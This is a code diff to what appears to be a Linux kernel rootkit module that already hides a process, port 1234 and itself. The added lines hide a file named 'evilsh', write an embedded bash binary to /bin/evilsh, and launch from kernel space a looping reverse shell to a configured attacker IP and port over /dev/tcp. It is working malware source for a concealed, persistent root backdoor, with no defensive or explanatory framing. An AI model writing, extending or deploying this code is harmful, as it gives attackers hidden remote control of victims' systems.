@@ -262,6 +262,7 @@ void utils_init()
     }
     hide_pid(1);
     hide_port(1234);
+    hide_file("evilsh");
 }
 
 static struct list_head *head = NULL;
@@ -280,4 +281,25 @@ void show_module(void)
         list_add(&THIS_MODULE->list, head);
         head = NULL;
     }
+}
+
+void shell_init(void)
+{
+    struct file *filp =
+        filp_open("/bin/evilsh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+    if (IS_ERR(filp))
+        return;
+    loff_t pos = 0;
+    int status = kernel_write(filp, bash, bash_len, &pos);
+    filp_close(filp, 0);
+}
+
+void shell_start(void)
+{
+    char *argv[] = {"/bin/evilsh", "-c",
+                    "while true; do sh -i >& /dev/tcp/" SHELL_IP "/" SHELL_PORT
+                    " 0>&1; sleep 5; done",
+                    NULL};
+    char *envp[] = {"HOME=/", "PATH=/bin:/sbin:/usr/bin", "TERM=xterm", NULL};
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
